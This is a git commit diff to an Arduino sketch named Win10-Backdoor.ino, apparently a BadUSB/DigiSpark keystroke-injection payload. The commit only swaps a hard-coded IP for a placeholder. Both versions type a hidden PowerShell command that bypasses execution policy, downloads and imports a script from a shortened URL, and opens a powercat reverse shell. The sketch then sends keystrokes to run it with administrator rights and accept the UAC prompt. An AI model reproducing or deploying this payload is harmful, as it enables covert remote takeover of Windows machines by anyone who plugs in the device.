64208f0984b496661e7e25a015f872d336adaf1a
Prodromos Nasis <79412734+pnasis@users.noreply.github.com>
2024-01-28 17:02:41 +0200

    Update Win10-Backdoor.ino

--- Win10-Backdoor.ino
+++ Win10-Backdoor.ino
@@ -3,7 +3,7 @@
 void setup() {
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(600);
-    DigiKeyboard.print("powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.0.208 -p 1234 -e powershell");
+    DigiKeyboard.print("powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c <attacker's-ip> -p <attacker's-port> -e powershell");
     DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, MOD_SHIFT_LEFT, KEY_ENTER);
     DigiKeyboard.delay(800);
     DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
